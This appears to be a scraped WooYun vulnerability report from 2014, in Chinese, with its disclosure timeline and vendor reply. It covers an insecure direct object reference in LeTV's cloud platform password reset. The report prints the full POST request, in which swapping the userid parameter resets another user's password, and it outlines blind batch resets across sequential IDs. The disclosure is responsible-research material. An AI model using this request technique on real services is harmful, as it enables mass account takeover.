{"id": 3489, "wybug_id": "wooyun-2014-059437", "wybug_title": "乐视某云平台可更改任意用户密码（涉及十多万用户）", "wybug_corp": "乐视网", "wybug_author": "魇", "wybug_date": "2014-05-04 23:12", "wybug_open_date": "2014-06-18 23:13", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-18：\t细节向公众公开  简要描述： 比较纠结..是盲改.. 详细说明：  http://www.letvcloud.com/乐视云视频\n\n在重置密码这里，经过测试，只要通过更改下列POST请求中userid参数就可以更改该帐号的密码(email参数随便填写没关系)\nPOST /user/resetpassword HTTP/1.1Host: www.letvcloud.comProxy-Connection: keep-aliveContent-Length: 78Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.letvcloud.comUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.letvcloud.com/user/checkresetpassword/ua/76a10db640c55446177617929964c6035818fdfe27c418d749da7eccff651fd9c93fb1be08845aba8dcd560f7a25718aaecc900faa48d6be40a043e136a347b2Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: PHPSESSID=8b0713c288f0295c47b0ea2f5cc5a709; Hm_lvt_984e73b4d6ff5ece34ec3da984ece290=1399210465,1399210872; Hm_lpvt_984e73b4d6ff5ece34ec3da984ece290=1399210872userid=121990&email=wooyunyana%40126.com&password=wooyun1&repassword=wooyun1\n但是比较纠结的是。虽然能更改该id,但是无法知晓该id对应的登录邮箱名,但是可以盲改，如从userid：1-121990，利用工具将所有用户批量修改成一个密码，然后...登录一些官方的帐号之类的，但是只是测试一下，没必要这么做..这里注册了2个帐号演示:A：wooyunyana@126.com 对应userid=121990B：wooyunyanb@126.com 对应userid=121993\n\n\n\n用A帐号找回密码，打开找回密码链接，将userid=121990修改成121993（也就是B帐号的userid）就可以修改到B帐号的密码了\n\n然后我输入一个新密码，点击设置密码，提示设置密码成功\n\n\n\n然后用新密码登录B帐号，也成功登录了\n\n因为我是用自己的帐号测试的，你们也可以复查一下，虽然不能知道该userid对应的帐号，但上面我也说了 可以盲改，userid值是递增的..十多万用户批量的话也只要些许时间而已..   漏洞证明：  #1 见详细说明#2 多次复测后我才发上来，你们也可以自查下   修复方案：  请验证用户操作的合法性   版权声明：转载请注明来源 魇@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2014-05-05 06:27 厂商回复： 感谢挖掘，马上修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-19 09:14 |    \t\t暗影侠客 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:5        | xss,inject,ctrf)\t\t \n  这种问题有点不应该！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}